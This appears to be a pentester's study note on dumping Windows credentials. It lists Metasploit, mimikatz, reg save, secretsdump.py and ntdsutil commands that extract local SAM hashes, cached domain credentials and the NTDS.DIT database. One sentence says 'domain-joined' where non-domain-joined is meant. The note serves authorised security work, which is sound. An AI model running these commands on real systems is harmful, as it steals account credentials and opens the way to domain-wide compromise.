@@ -1,0 +1,79 @@
+---
+title: Dumping Windows Credentials
+draft: false
+tags:
+  - pentesting
+  - windows
+  - credentials
+---
+# Dumping Windows Credentials
+
+https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets
+https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
+
+##  Terminology
+
+- SAM: Database file that contains local username and passwords (like /etc/shadow)
+- NTDS.DIT: Database file that contains all Active Directory objects, stored on DC
+- DC: Domain Controller
+
+##  Prerequisites
+
+NT AUTHORITY\SYSTEM (aka Administrator) is needed to dump credentials.
+
+```
+meterpreter > getsystem
+
+mimikatz > privilege::debug
+mimikatz > token::elevate
+```
+
+## Non domain-joined machine
+
+With domain-joined machines, passwords will be saved locally in `C:\Windows\System32\config\SAM`
+
+Returns: `username:rid:lm:nt::::`
+
+```
+meterpreter > hashdump
+
+reg save HKLM\SAM SAM
+reg save HKLM\SYSTEM SYSTEM
+secretsdump.py -sam SAM -system SYSTEM LOCAL
+```
+
+## Domain joined machine
+
+With a domain joined machine (that is not a Domain Controller) we can extract local passwords from SAM and also cached passwords (Mscash2). 
+
+Returns: `username:hash::`
+
+```
+meterpreter > bg
+msf6 > use post/windows/gather/cachedump
+
+mimikatz > lsadump::cache
+
+reg save HKLM\SAM SAM
+reg save HKLM\SECURITY SECURITY
+reg save HKLM\SYSTEM SYSTEM
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+```
+
+## Domain Controller
+
+Having access to a Domain Controller (DC) gives us access to NTDS.DIT. We cannot copy this file normally, as it's always in use, but we can use ntdsutil or vssadmin. 
+
+Returns: `domain\username:rid:lm:nt::::`
+
+```
+meterpreter > bg
+msf6 > use post/windows/gather/credentials/domain_hashdump
+
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
+secretsdump.py -ntds NTDS.DIT -security SECURITY -system SYSTEM LOCAL
+```
+
+## Next Steps
+- [[crackingdumpedwindowshashes|Cracking Dumped Windows Hashes]]
+- [[passthehashattack|Pass-the-Hash Attack]]
